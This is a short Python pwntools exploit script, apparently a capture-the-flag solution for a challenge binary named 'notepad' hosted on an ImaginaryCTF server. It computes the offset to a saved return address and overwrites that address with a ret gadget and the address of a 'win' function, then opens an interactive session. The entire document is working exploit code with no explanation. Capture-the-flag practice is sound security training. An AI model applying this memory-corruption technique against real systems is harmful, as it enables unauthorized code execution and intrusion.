from pwn import *

win = 0x0000000000401182
ret_gadget = 0x0000000000401016

DEBUG = False

if DEBUG:
    r = process("notepad")
else:
    r = remote("puzzler7.imaginaryctf.org", 3001)

str_addr = 0x7fffffffdec0
edit_ret_addr = 0x7fffffffdea8

offset = edit_ret_addr - str_addr

print(r.recvuntil(">>> "))
r.sendline("2")
print(r.recvuntil(">>> "))
r.sendline(str(offset))
print(r.recvuntil(">>> "))
r.sendline(p64(ret_gadget) + p64(win))

r.interactive()